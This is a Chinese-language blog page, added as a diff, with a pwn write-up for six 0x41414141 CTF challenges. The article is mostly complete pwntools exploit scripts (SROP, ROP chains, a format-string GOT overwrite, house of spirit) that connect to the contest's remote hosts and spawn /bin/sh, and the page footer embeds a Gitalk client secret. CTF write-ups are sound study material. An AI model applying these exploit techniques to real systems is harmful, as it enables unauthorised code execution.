@@ -1,0 +1,516 @@
+<!DOCTYPE html>
+<html>
+
+<head><meta name="generator" content="Hexo 3.9.0">
+  
+  <title>0x41414141ctf_pwn_wp - 广莫之野</title>
+  <meta charset="UTF-8">
+  <meta name="description" content>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  
+  
+
+  <link rel="shortcut icon" href="/home.png" type="image/png">
+  <meta name="description" content="0x41414141ctf pwn题 writeup这比赛难度很友好">
+<meta name="keywords" content="ctf,pwn">
+<meta property="og:type" content="article">
+<meta property="og:title" content="0x41414141ctf_pwn_wp">
+<meta property="og:url" content="http://shiroinu.top/2021/01/27/0x41414141ctf-pwn-wp/index.html">
+<meta property="og:site_name" content="广莫之野">
+<meta property="og:description" content="0x41414141ctf pwn题 writeup这比赛难度很友好">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2021-03-07T09:16:13.126Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="0x41414141ctf_pwn_wp">
+<meta name="twitter:description" content="0x41414141ctf pwn题 writeup这比赛难度很友好">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdui@0.4.3/dist/css/mdui.min.css">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.15.8/styles/atom-one-dark.css">
+   
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css">
+  
+  
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1038733_0xvrvpg9c0r.css">
+  <link rel="stylesheet" href="/css/style.css?v=1615121782846">
+</head>
+
+<body class="mdui-drawer-body-left">
+  
+  <div id="nexmoe-background">
+    <div class="nexmoe-bg" style="background-image: url(/images/back1.png)"></div>
+    <div class="mdui-appbar mdui-shadow-0">
+      <div class="mdui-toolbar">
+        <a mdui-drawer="{target: '#drawer', swipe: true}" title="menu" class="mdui-btn mdui-btn-icon"><i class="mdui-icon material-icons">menu</i></a>
+        <div class="mdui-toolbar-spacer"></div>
+        <!--<a href="javascript:;" class="mdui-btn mdui-btn-icon"><i class="mdui-icon material-icons">search</i></a>-->
+        <a href="/" title="tsts" class="mdui-btn mdui-btn-icon"><img src="/images/head.png"></a>
+       </div>
+    </div>
+  </div>
+  <div id="nexmoe-header">
+      <div class="nexmoe-drawer mdui-drawer" id="drawer">
+    <div class="nexmoe-avatar mdui-ripple">
+        <a href="/" title="tsts">
+            <img src="/images/head.png" alt="tsts">
+        </a>
+    </div>
+    <div class="nexmoe-count">
+        <div><span>文章</span>20</div>
+        <div><span>标签</span>2</div>
+        <div><span>分类</span>0</div>
+    </div>
+    <ul class="nexmoe-list mdui-list" mdui-collapse="{accordion: true}">
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple" href="/" title="回到首页">
+            <i class="mdui-list-item-icon nexmoefont icon-home"></i>
+            <div class="mdui-list-item-content">
+                回到首页
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple" href="/about.html" title="关于博客">
+            <i class="mdui-list-item-icon nexmoefont icon-info-circle"></i>
+            <div class="mdui-list-item-content">
+                关于博客
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple" href="/PY.html" title="我的朋友">
+            <i class="mdui-list-item-icon nexmoefont icon-unorderedlist"></i>
+            <div class="mdui-list-item-content">
+                我的朋友
+            </div>
+        </a>
+        
+    </ul>
+    <aside id="nexmoe-sidebar">
+  
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">社交按钮</h3>
+    <div class="nexmoe-widget nexmoe-social">
+        <a class="mdui-ripple" href="https://github.com/killthatshaman/" target="_blank" mdui-tooltip="{content: 'GitHub'}" style="color: rgb(25, 23, 23);background-color: rgba(25, 23, 23, .15);">
+            <i class="nexmoefont icon-github"></i>
+        </a>
+    </div>
+</div>
+  
+  
+
+  
+  
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">标签云</h3>
+    <div id="randomtagcloud" class="nexmoe-widget tagcloud">
+      <a href="/tags/ctf/" style="font-size: 20px;">ctf</a> <a href="/tags/pwn/" style="font-size: 10px;">pwn</a>
+    </div>
+    
+  </div>
+
+  
+  
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">文章归档</h3>
+    <div class="nexmoe-widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/03/">三月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">一月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/">六月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">五月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/04/">四月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">三月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">十二月 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">十一月 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">十月 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/09/">九月 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/08/">八月 2019</a></li></ul>
+    </div>
+  </div>
+
+
+  
+</aside>
+    <div class="nexmoe-copyright">
+        &copy; 2021 tsts
+        Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+        & <a href="https://nexmoe.com/hexo-theme-nexmoe.html" target="_blank">Nexmoe</a>
+    </div>
+</div><!-- .nexmoe-drawer -->
+  </div>
+  <div id="nexmoe-content">
+    <div class="nexmoe-primary">
+        <div class="nexmoe-post">
+    <div class="nexmoe-post-cover"> 
+        
+            <img src="/images/back1.png">
+        
+        <h1>0x41414141ctf_pwn_wp</h1>
+    </div>
+  <div class="nexmoe-post-meta">
+    <a><i class="nexmoefont icon-calendar-fill"></i>2021年01月27日</a>
+    <a><i class="nexmoefont icon-areachart"></i>1.8k 字</a>
+    <a><i class="nexmoefont icon-time-circle-fill"></i>大概 10 分钟</a>
+    
+    
+      <a class="nexmoefont icon-tag-fill -link" href="/tags/ctf/">ctf</a> <a class="nexmoefont icon-tag-fill -link" href="/tags/pwn/">pwn</a>
+    
+  </div>
+  <article>
+    <p>0x41414141ctf pwn题 writeup<br>这比赛难度很友好</p>
+<a id="more"></a>
+<h1 id="Moving-signals"><a href="#Moving-signals" class="headerlink" title="Moving signals"></a>Moving signals</h1><p>短小精悍,没开nx保护,直接srop即可</p>
+<pre><code class="python">from pwn import *
+context.log_level = &#39;DEBUG&#39;
+context.arch = &#39;amd64&#39;
+# sh = process(&#39;./moving-signals&#39;)
+sh = remote(&#39;185.172.165.118&#39;,2525)
+# gdb.attach(sh)
+# pause()
+sigframe = SigreturnFrame()
+
+sigframe.rax = constants.SYS_read
+sigframe.rdi = 0
+sigframe.rsi = 0x41100
+sigframe.rdx = 0x400
+sigframe.rsp = 0x41100
+sigframe.rip = 0x41015
+payload = &#39;a&#39; * 8 
+payload += p64(0x41018)
+payload += p64(15)
+payload += p64(0x41015)
+payload += str(sigframe)
+payload = payload.ljust(0x1F4,&#39;\x00&#39;)
+sh.send(payload)
+sh.sendline(p64(0x41108) + asm(shellcraft.sh()))
+sh.interactive()</code></pre>
+<h1 id="external"><a href="#external" class="headerlink" title="external"></a>external</h1><p>rop,但是执行了函数把got表清0了,没法直接调plt,因此用syscall read,往got表中读,恢复got表中初始内容(动态链接前的got表内容是plt表call指令的下一条指令的地址,具体参见动态链接过程)就可以了.</p>
+<pre><code class="python">from pwn import *
+context.log_level = &#39;DEBUG&#39;
+# sh = process(&quot;./external&quot;)
+sh =remote(&#39;161.97.176.150&#39;,9999)
+# libc = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)
+libc = ELF(&#39;./libc-2.28.so&#39;)
+# gdb.attach(sh,&#39;b * 0x40125F&#39;)
+# pause()
+sh.recvuntil(&#39;&gt; &#39;)
+syscall = 0x401283 
+syswrite = 0x40127c
+rdi_ret = 0x00000000004012f3
+rsi_r15_ret = 0x00000000004012f1
+stdin = 0x404070 
+got_base = 0x404018
+nex = 0x0000000000401036
+start = 0x4010a0
+got_list = &#39;&#39;
+for i in range(7):
+    got_list += p64(nex)
+    nex += 0x10
+log.info(hex(len(got_list)))
+payload = &#39;a&#39; * 0x58 + p64(rdi_ret) + p64(0) + p64(rsi_r15_ret) + p64(got_base) + p64(0) + p64(syscall) +  p64(rdi_ret) + p64(1) + p64(rsi_r15_ret) + p64(stdin) + p64(0) + p64(syswrite) + p64(start)
+payload = payload.ljust(0xf0,&#39;a&#39;)
+sh.send(payload)
+sh.send(got_list)
+libc_base = u64(sh.recv(6).ljust(8,&#39;\x00&#39;)) - libc.symbols[&#39;_IO_2_1_stdin_&#39;]
+log.success(&#39;libc_base = &#39; + hex(libc_base))
+system = libc_base + libc.symbols[&quot;system&quot;]
+bin_sh = libc_base + libc.search(&quot;/bin/sh\x00&quot;).next()
+sh.recvuntil(&#39;&gt; &#39;)
+payload = &#39;a&#39; * 0x58 + p64(rdi_ret) + p64(bin_sh) + p64(system)
+sh.sendline(payload)
+sh.interactive()</code></pre>
+<h1 id="The-Pwn-Inn"><a href="#The-Pwn-Inn" class="headerlink" title="The Pwn Inn"></a>The Pwn Inn</h1><p>格式化字符串,第一次修改exit got表为start,之后无限循环,可以泄露libc地址,最后修改printf got表为system地址即可,但必须一次修改完成</p>
+<pre><code class="python">from pwn import *
+context.log_level = &#39;DEBUG&#39;
+sh = process(&#39;./the_pwn_inn&#39;)
+sh = remote(&#39;185.172.165.118&#39;,2626)
+libc = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)
+# gdb.attach(sh,&#39;b * 0x401319&#39;)
+exit_got = 0x404058
+printf_got = 0x404030
+start = 0x4010c0
+stack_chk_fail = 0x404028
+payload = &quot;%192c%8$hhnaaaaa&quot; + p64(exit_got)
+sh.recvuntil(&#39;name?&#39;)
+sh.sendline(payload)
+payload = &quot;%7$s;aaa&quot; + p64(printf_got)
+sh.recvuntil(&#39;name?&#39;)
+sh.sendline(payload)
+sh.recvuntil(&#39;Welcome &#39;)
+libc_base = u64(sh.recvuntil(&#39;;&#39;,drop=True).ljust(8,&#39;\x00&#39;)) - 0x0000000000064e10
+# libc_base = u64(sh.recvuntil(&#39;;&#39;,drop=True).ljust(8,&#39;\x00&#39;)) - libc.symbols[&quot;printf&quot;]
+
+log.success(&#39;libc_base = &#39; + hex(libc_base))
+one_gadget = libc_base + 0x45226
+system = libc_base + 0x0000000000055410
+# system = libc_base + libc.symbols[&#39;system&#39;]
+
+log.info(hex(one_gadget))
+sh.recvuntil(&#39;name?&#39;)
+payload = &quot;&quot;
+bef = system &amp; 0xff
+tot = 0
+for i in range(6):
+    tmp = system &amp; 0xff
+    x = tmp - tot &amp; 0xff
+    string = &quot;%&quot; + str(x) + &quot;c&quot;
+    string += &quot;%&quot; + str(18+i) + &quot;$hhn&quot;
+    off =  0x10 - len(string)
+    string = string + &#39;a&#39; * off
+    tot += x + off
+    payload += string
+    system = system &gt;&gt; 8
+for j in range(6):
+    payload += p64(printf_got + j)
+log.success(hex((len(payload))))
+sh.sendline(payload)
+sh.sendline(&#39;/bin/sh\x00&#39;)
+sh.interactive()</code></pre>
+<h1 id="echo"><a href="#echo" class="headerlink" title="echo"></a>echo</h1><p>主要利用关键点是<code>p64(echo) + p64(syscall) + str(sigframe)</code><br>第一次返回地址是<code>0x401000</code>的<code>push rbp</code>而不是<code>0x40103D</code>的<code>call echo</code><br>不使用call,少了一次<code>push rip</code>,因此第二次进入的echo函数栈会被抬高<code>0x8</code>,第二次就返回到之前读入的syscall;<br>因此在第二次read读的时候输入15个字符,控制<code>rax = 15</code>执行sigreturn即可.</p>
+<pre><code class="python">from pwn import *
+context.log_level = &#39;debug&#39;
+context.arch = &quot;amd64&quot;
+# sh = process(&#39;./echo&#39;)
+# 
+sh = remote(&#39;185.172.165.118&#39;,9090)
+# gdb.attach(sh)
+# pause()
+syscall = 0x40104C
+bin_sh = 0x401035
+echo = 0x401000
+sigframe = SigreturnFrame()
+sigframe.rax = constants.SYS_execve
+sigframe.rdi = bin_sh
+sigframe.rsi = 0x0
+sigframe.rdx = 0x0
+sigframe.rip = syscall
+payload = &#39;a&#39; * 15
+payload = payload.ljust(0x188,&#39;b&#39;) 
+payload += p64(echo) + p64(syscall) + str(sigframe)
+sh.sendline(payload)
+# 
+sh.sendline(&#39;a&#39; * 14)
+sh.interactive()</code></pre>
+<h1 id="Return-Of-The-ROPs"><a href="#Return-Of-The-ROPs" class="headerlink" title="Return Of The ROPs"></a>Return Of The ROPs</h1><p>主要在于rop之前的md5爆破,用c写一个模拟程序即可,恶心的地方在于Ubuntu16.04的openSSL不带libcrypto,搞了半天最后还是直接起了docker</p>
+<h2 id="md5-c"><a href="#md5-c" class="headerlink" title="md5.c"></a>md5.c</h2><pre><code class="c">#include &lt;openssl/md5.h&gt;
+#include &lt;string.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;time.h&gt;
+int main(void)
+{
+    MD5_CTX ctx;
+    time_t t;
+    unsigned char outmd[16];
+    char string[5];
+    memset(string,0,sizeof(string));
+    t = time(0);
+    for(int times = 0;times &lt; 90;++times)
+    {
+        srand(t);
+        for (int i = 0;i&lt;4;++i)
+        {
+            string[i] = rand() % 26 + 97;
+        }
+        puts(&quot;--------&quot;);
+        puts(string);
+        memset(outmd,0,sizeof(outmd));
+        MD5_Init(&amp;ctx);
+        MD5_Update(&amp;ctx,string,4);
+        MD5_Final(outmd,&amp;ctx);
+        // puts(outmd);
+        for(int j = 0;j&lt;16;++j)
+        {
+            printf(&quot;%02x&quot;,outmd[j]);
+        }
+        printf(&quot;\n&quot;);
+        getchar();
+        t ++;
+    }
+    return 0;
+
+
+}</code></pre>
+<p>编译用<code>gcc md5.c -g -o md5test -lcrypto</code></p>
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>好像可以用ret2csu,不过习惯直接用libc里面的gadgets了,就是远程libc版本试起来有点恶心;<br>直接system(‘/bin/sh’)好像有点问题,稳妥起见用的execve.</p>
+<pre><code class="python">from pwn import *
+from ctypes import *
+context.log_level = &#39;DEBUG&#39;
+context.terminal = [&#39;tmux&#39;,&#39;sp&#39;,&#39;-h&#39;]
+# libssl = CDLL(&#39;./libcrypto.so.1.1&#39;)
+md5 = process(&#39;./md5test&#39;)
+# sh = process(&#39;./main.sh&#39;)
+sh =remote(&#39;185.172.165.118&#39;,2222)
+libc = ELF(&#39;./libc-2.31_ubuntu9.1.so&#39;)
+# libc = ELF(&#39;/lib/x86_64-linux-gnu/libc-2.27.so&#39;)
+sh.recvuntil(&#39;where MD5(X)[-6:] = &#39;)
+tar = sh.recv(6)
+log.info(tar)
+for i in range(100):
+    md5.recvuntil(&quot;--------\n&quot;)
+    string = md5.recvline()[:-1]
+    ans = md5.recvline()[-7:][:-1]
+    log.info(ans)
+    if(ans == tar):
+        log.success(string)
+        sh.sendline(string)
+        md5.close()
+        break
+    md5.sendline(&quot;&quot;)
+rdi_ret = 0x0000000000401263
+rsi_r15_ret = 0x0000000000401261
+puts_got = 0x404018
+start = 0x401070
+puts_plt = 0x401030
+gets_plt = 0x401050
+payload = &#39;a&#39; * 0x27 + &#39;z&#39; + p64(rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(start)
+
+sh.recvuntil(&quot;say?\n&quot;)
+sh.sendline(payload)
+sh.recvuntil(&#39;az&#39;)
+sh.recv(3)
+libc_base = u64(sh.recv(6).ljust(8,&#39;\x00&#39;)) - libc.symbols[&#39;puts&#39;]
+log.success(&quot;libc_base = &quot; + hex(libc_base))
+system = libc_base + libc.symbols[&quot;system&quot;]
+execve = libc_base + libc.symbols[&quot;execve&quot;]
+bin_sh = libc_base + libc.search(&#39;/bin/sh\x00&#39;).next()
+rdx_r12_ret = 0x000000000011c371 + libc_base
+rdx_ret = 0x0000000000115b12 + libc_base
+payload = &#39;a&#39; * 0x28 + p64(rdi_ret) + p64(bin_sh) + p64(rsi_r15_ret) + p64(0) + p64(0)
+payload += p64(rdx_r12_ret) + p64(0) +p64(0)  + p64(execve)
+sh.sendline(payload)
+sh.interactive()</code></pre>
+<h1 id="Faking-till-you’re-Making"><a href="#Faking-till-you’re-Making" class="headerlink" title="Faking till you’re Making"></a>Faking till you’re Making</h1><p>和上一题一样的PoW,改成了sha256,稍作修改即可.<br>vuln利用点在于<code>house of spirit</code>,构造size = 0x41的假chunk,free之后被malloc出来即可栈溢出.</p>
+<h2 id="sha256-c"><a href="#sha256-c" class="headerlink" title="sha256.c"></a>sha256.c</h2><pre><code class="c">#include &lt;openssl/sha.h&gt;
+#include &lt;string.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;time.h&gt;
+int main(void)
+{
+    SHA256_CTX ctx;
+    time_t t;
+    unsigned char outmd[SHA256_DIGEST_LENGTH];
+    char string[5];
+    memset(string,0,sizeof(string));
+    t = time(0);
+    for(int times = 0;times &lt; 90;++times)
+    {
+        srand(t);
+        for (int i = 0;i&lt;4;++i)
+        {
+            string[i] = rand() % 26 + 97;
+        }
+        puts(&quot;--------&quot;);
+        puts(string);
+        memset(outmd,0,sizeof(outmd));
+        // MD5_Init(&amp;ctx);
+        SHA256_Init(&amp;ctx);
+        SHA256_Update(&amp;ctx,string,4);
+        SHA256_Final(outmd,&amp;ctx);
+        // puts(outmd);
+        for(int j = 0;j&lt;32;++j)
+        {
+            printf(&quot;%02x&quot;,outmd[j]);
+        }
+        printf(&quot;\n&quot;);
+        getchar();
+        t ++;
+    }
+    return 0;
+
+
+}</code></pre>
+<h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><pre><code class="python">from pwn import *
+
+context.log_level = &#39;DEBUG&#39;
+context.terminal = [&#39;tmux&#39;,&#39;sp&#39;,&#39;-h&#39;]
+# libssl = CDLL(&#39;./libcrypto.so.1.1&#39;)
+sha = process(&#39;./shatest&#39;)
+# sh = process(&#39;./main.sh&#39;)
+sh = remote(&#39;185.172.165.118&#39;,2929)
+# sh =remote(&#39;185.172.165.118&#39;,2222)
+# libc = ELF(&#39;./libc-2.31_ubuntu9.1.so&#39;)
+libc = ELF(&#39;/lib/x86_64-linux-gnu/libc-2.27.so&#39;)
+sh.recvuntil(&#39;where SHA256(X)[-6:] = &#39;)
+tar = sh.recv(6)
+log.info(tar)
+for i in range(100):
+    sha.recvuntil(&quot;--------\n&quot;)
+    string = sha.recvline()[:-1]
+    ans = sha.recvline()[-7:][:-1]
+    log.info(ans)
+    if(ans == tar):
+        log.success(string)
+        sh.sendline(string)
+        sha.close()
+        break
+    sha.sendline(&quot;&quot;)
+sh.recvuntil(&quot;that&#39;s correct\\n\n&quot;)
+backdoor = int(sh.recvline(),16)
+fake_chunk = p64(0) + p64(0x41) + p64(0) * 6 + p64(0) + p64(0x31)
+sh.send(fake_chunk)
+payload = &#39;a&#39; * 0x58 + p64(backdoor)
+sh.sendline(payload)
+# rdi_ret = 0x0000000000401263
+# rsi_r15_ret = 0x0000000000401261
+# puts_got = 0x404018
+# start = 0x401070
+# puts_plt = 0x401030
+# gets_plt = 0x401050
+# payload = &#39;a&#39; * 0x27 + &#39;z&#39; + p64(rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(start)
+
+# sh.recvuntil(&quot;say?\n&quot;)
+# sh.sendline(payload)
+# sh.recvuntil(&#39;az&#39;)
+# sh.recv(3)
+# libc_base = u64(sh.recv(6).ljust(8,&#39;\x00&#39;)) - libc.symbols[&#39;puts&#39;]
+# log.success(&quot;libc_base = &quot; + hex(libc_base))
+# system = libc_base + libc.symbols[&quot;system&quot;]
+# execve = libc_base + libc.symbols[&quot;execve&quot;]
+# bin_sh = libc_base + libc.search(&#39;/bin/sh\x00&#39;).next()
+# rdx_r12_ret = 0x000000000011c371 + libc_base
+# rdx_ret = 0x0000000000115b12 + libc_base
+# payload = &#39;a&#39; * 0x28 + p64(rdi_ret) + p64(bin_sh) + p64(rsi_r15_ret) + p64(0) + p64(0)
+# payload += p64(rdx_r12_ret) + p64(0) +p64(0)  + p64(execve)
+# sh.sendline(payload)
+sh.interactive()</code></pre>
+
+  </article>
+  
+    
+
+  
+  <section class="nexmoe-comment">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1.5.0/dist/gitalk.min.css">
+<div id="gitalk"></div>
+<script src="https://cdn.jsdelivr.net/npm/gitalk@1.5.0/dist/gitalk.min.js"></script>
+<script type="text/javascript">
+    var gitalk = new Gitalk({
+        clientID: '80b2453b6d5f37ad6225',
+        clientSecret: '43e99fa852795c9a7b3eb924b2558c64b84bbdeb',
+        id: window.location.pathname,
+        repo: 'nexmoe.github.io',
+        owner: 'nexmoe',
+        admin: 'nexmoe'
+    })
+    gitalk.render('gitalk')
+</script>
+</section>
+</div>
+    </div>
+  </div>
+  <script src="https://cdn.jsdelivr.net/npm/mdui@0.4.3/dist/js/mdui.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/jquery@3.4.1/dist/jquery.min.js"></script>
+ 
+    <script src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
+
+
+ 
+    <script src="https://cdn.jsdelivr.net/npm/smoothscroll-for-websites@1.4.9/SmoothScroll.min.js"></script>
+
+
+<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.8/build/highlight.min.js"></script>
+<script>hljs.initHighlightingOnLoad();</script>
+
+<script src="/js/app.js?v=1615121782849"></script>
+<script src="https://cdn.jsdelivr.net/npm/lazysizes@5.1.0/lazysizes.min.js"></script>
+
+
+
+
+  
+
+
+
+
+
+</body>
+
+</html>
